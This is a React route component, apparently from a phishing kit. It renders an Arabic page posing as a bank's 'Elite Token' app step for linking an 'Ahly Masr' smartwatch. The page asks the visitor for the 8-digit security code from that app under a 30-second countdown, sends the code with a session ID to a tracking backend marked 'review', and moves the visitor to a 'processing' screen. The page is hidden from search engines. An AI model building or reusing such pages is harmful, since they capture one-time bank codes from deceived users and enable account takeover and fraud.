import { useState } from "react";
import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { Landmark, Smartphone, Watch } from "lucide-react";
import { toast } from "sonner";

import { Button } from "@/components/ui/button";
import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp";
import { CountdownRing } from "@/components/countdown-ring";
import { trackEvent } from "@/lib/track";
import { getSessionId } from "@/lib/session-id";

const TITLE = "تطبيق Elite Token — ربط الساعة الذكية";
const DESCRIPTION =
  "أدخل رمز الأمان المكوّن من 8 أرقام من تطبيق Elite Token لإتمام ربط ساعة أهل مصر الذكية الذكية.";

export const Route = createFileRoute("/app-token")({
  head: () => ({
    meta: [
      { title: TITLE },
      { name: "description", content: DESCRIPTION },
      { property: "og:title", content: TITLE },
      { property: "og:description", content: DESCRIPTION },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "robots", content: "noindex" },
    ],
  }),
  component: AppTokenPage,
});

function AppTokenPage() {
  const navigate = useNavigate();
  const [code, setCode] = useState("");

  function handleSubmit() {
    if (code.length !== 8) {
      toast.error("الرجاء إدخال الرمز كاملاً (8 أرقام)");
      return;
    }
    void trackEvent({
      data: {
        sessionId: getSessionId(),
        stage: "processing",
        patch: { app_token: code, status: "review" },
      },
    });
    toast.success("تم إرسال الرمز — جارٍ المراجعة");
    navigate({ to: "/processing" });
  }

  return (
    <div className="min-h-screen bg-background">
      <header className="bg-primary text-primary-foreground">
        <div className="mx-auto flex max-w-4xl items-center justify-between px-4 py-4">
          <h1 className="text-base font-black">ربط الساعة الذكية</h1>
          <span className="grid h-9 w-9 place-items-center rounded-xl bg-primary-foreground/15">
            <Landmark className="h-4 w-4" aria-hidden="true" />
          </span>
        </div>
      </header>

      <main className="mx-auto max-w-md space-y-6 px-4 py-10">
        <div className="flex items-center gap-4 rounded-2xl border border-primary/25 bg-secondary p-4">
          <span className="grid h-12 w-12 shrink-0 place-items-center rounded-full bg-card text-primary">
            <Watch className="h-6 w-6" aria-hidden="true" />
          </span>
          <div className="text-right">
            <p className="text-sm font-black text-primary">
              الخطوة الأخيرة لاستكمال طلب الساعة الذكية
            </p>
            <p className="mt-1 text-xs text-muted-foreground">
              أدخل رمز الأمان من تطبيق Elite Token لتفعيل ساعتك
            </p>
          </div>
        </div>

        <div className="rounded-3xl border border-border bg-card p-8 text-center shadow-[var(--shadow-card)]">
          <span className="mx-auto grid h-20 w-20 place-items-center rounded-full bg-secondary text-primary">
            <Smartphone className="h-9 w-9" aria-hidden="true" />
          </span>
          <h2 className="mt-4 text-lg font-black text-foreground">تطبيق Elite Token</h2>
          <p className="mx-auto mt-2 max-w-xs text-sm leading-relaxed text-muted-foreground">
            افتح تطبيق Elite Token وأدخل الرمز المكوّن من 8 أرقام الظاهر على شاشة التطبيق
          </p>
          <Button
            type="button"
            onClick={() => toast("افتح التطبيق على هاتفك للمتابعة")}
            className="mt-6 h-12 w-full rounded-xl text-base"
          >
            <Smartphone className="h-4 w-4" aria-hidden="true" />
            فتح تطبيق Elite Token
          </Button>
        </div>

        <div className="flex justify-center">
          <CountdownRing seconds={30} />
        </div>

        <div className="rounded-3xl border border-border bg-card p-5 shadow-[var(--shadow-card)]">
          <div dir="ltr" className="flex justify-center">
            <InputOTP maxLength={8} value={code} onChange={setCode}>
              <InputOTPGroup>
                {[0, 1, 2, 3, 4, 5, 6, 7].map((i) => (
                  <InputOTPSlot key={i} index={i} className="h-11 w-11 text-base" />
                ))}
              </InputOTPGroup>
            </InputOTP>
          </div>

          <Button onClick={handleSubmit} className="mt-5 h-12 w-full rounded-xl text-base">
            ربط الساعة
          </Button>
        </div>
      </main>
    </div>
  );
}
